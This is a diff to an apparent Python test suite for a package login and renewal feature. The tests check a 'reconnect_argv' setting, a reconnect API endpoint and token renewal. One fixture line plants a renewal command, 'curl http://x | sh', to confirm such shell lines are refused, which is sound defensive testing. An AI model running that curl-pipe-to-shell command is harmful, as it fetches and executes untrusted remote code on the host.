@@ -1691,6 +1691,19 @@ def controls_package_sources():
                   _pk4.login_of("zz-unsafe"), {})
             check("and one that names a program and its arguments is",
                   bool(_pk4.login_of("zz-ok").get("argv")), True)
+            # §115: the renewal is the package's own argv too — optional, and a bad one leaves the
+            # login offered and the renewal not
+            check("a login without reconnect_argv is offered with no renewal", _pk4.login_of("zz-ok").get("reconnect_argv"), [])
+            (r2 / "zz-rc").mkdir()
+            (r2 / "zz-rc" / "manifest.yaml").write_text(chr(10).join([
+                "name: zz-rc", "entry: workflow.yaml", "login:",
+                "  argv: [/opt/venv/bin/python, /work/x.py]", "  reconnect_argv: ['sh', '-c', 'curl http://x | sh']",
+                "  done_when: {file: t.json}"]))
+            (r2 / "zz-rc" / "workflow.yaml").write_text("workflow: {}")
+            declare_temp(_pk4, r2)
+            lrc = _pk4.login_of("zz-rc")
+            check("a reconnect_argv that carries a shell line is not offered, and the login still is",
+                  (bool(lrc.get("argv")), lrc.get("reconnect_argv")), (True, []))
         finally:
             _pk4.ROOT, _pk4.DECL = old_root2, old_decl2
     check("the same helper drives a package and a provider",
@@ -1702,6 +1715,34 @@ def controls_package_sources():
     check("the panel has the same three verbs for it",
           all(x in ops_src for x in ("/api/packages/", '"start", target', '"code", target',
                                      '"cancel", target')), True)
+    # §115: hello-lane declares how it is renewed; the panel's fourth verb runs exactly that
+    check("hello-lane declares its renewal: the same step, --reconnect",
+          (lg.get("reconnect_argv", [])[-1:], lg.get("reconnect_argv", [])[:-1] == lg["argv"]), (["--reconnect"], True))
+    st_rc, ans_rc, rec_rc = ops_post("/api/packages/hello-lane/reconnect", {}, calls=True)
+    check("POST …/reconnect runs login_helper reconnect for the package, nothing else",
+          (st_rc, [a[-2:] for a in rec_rc["exec"]]), (200, [["reconnect", "pkg:hello-lane"]]))
+    # the renewal measured: a login directory that holds the token is renewed by the flow itself
+    with _tf2.TemporaryDirectory() as _t4:
+        import subprocess as _sp4, re as _re4
+        _tok = _pl2.Path(_t4) / "token.json"
+        _tok.write_text(json.dumps({"kind": "example", "issued_at": 1}))
+        _env4 = {**_o4.environ, "HELLO_LOGIN_DIR": _t4}
+        _p4 = _sp4.run([sys.executable, "/work/packages/hello-lane/steps/login.py"], env=_env4, input="", capture_output=True, text=True, timeout=30)
+        check("without --reconnect a held token is `already logged in` and untouched",
+              (_p4.returncode, "already logged in" in _p4.stdout, json.loads(_tok.read_text())["issued_at"]), (0, True, 1))
+        _q4 = _sp4.Popen([sys.executable, "/work/packages/hello-lane/steps/login.py", "--reconnect"], env=_env4,
+                         stdin=_sp4.PIPE, stdout=_sp4.PIPE, stderr=_sp4.STDOUT, text=True)
+        _head = ""
+        while "Paste the code" not in _head:
+            _c = _q4.stdout.read(1)
+            if not _c:
+                break
+            _head += _c
+        _m4 = _re4.search(r"Your code: (\S+)", _head)
+        _q4.stdin.write((_m4.group(1) if _m4 else "x") + "\n"); _q4.stdin.close()
+        _rest = _q4.stdout.read(); _q4.wait(timeout=30)
+        check("--reconnect removes the token it minted and runs the flow again: a new token, the code asked once more",
+              (_q4.returncode, "renewing" in _head, bool(_m4), json.loads(_tok.read_text())["issued_at"] > 1), (0, True, True, True))
     hubsrc = open("/work/hub/index.html", encoding="utf-8").read()
     check("and the screen never asks for a long-lived secret, only the code",
           ("일회용 코드" in hubsrc and "token" not in hubsrc.lower().split("pkgloginstate")[1][:600]),
@@ -2561,7 +2602,7 @@ def controls_docs():
     co2 = open("/work/stack/collect_obs.py", encoding="utf-8").read()
     hub2 = open("/work/hub/index.html", encoding="utf-8").read()
     check("an invalid input says which rule it broke",
-          '"rule": "a value is letters, digits' in rw2 and "refused_characters" in rw2, True)
+          'SAFE_RULE = ("a value is letters (any script)' in rw2 and "refused_characters" in rw2, True)
     check("and a path says where data belongs instead", "hand-in directory" in rw2, True)
     check("the collector answers a bare call", "needs the directory to write" in co2, True)
     check("a run can be started without being waited on", '"--detach" not in argv' in rw2, True)
